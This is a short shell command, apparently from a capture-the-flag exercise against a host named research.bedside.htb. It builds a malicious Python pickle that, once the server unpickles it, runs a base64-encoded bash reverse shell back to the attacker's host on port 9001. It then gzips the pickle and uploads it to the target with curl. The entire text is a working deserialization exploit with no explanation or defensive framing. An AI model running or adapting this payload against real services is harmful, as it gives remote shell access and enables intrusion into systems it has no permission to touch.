LHOST="$LHOST" python3 -c '
import os, pickle, gzip, base64
h = os.environ["LHOST"]
sh = f"bash -i >& /dev/tcp/{h}/9001 0>&1"
cmd = "echo "+base64.b64encode(sh.encode()).decode()+"|base64 -d|bash"
E = type("E", (), {"__reduce__": lambda s: (eval, (f"__import__(\"os\").system({cmd!r}) or {{}}",))})
gzip.open("pwn.pickle.gz", "wb").write(pickle.dumps(E()))
' && curl -s -F "uploadFile=@./pwn.pickle.gz;type=application/gzip" http://research.bedside.htb/
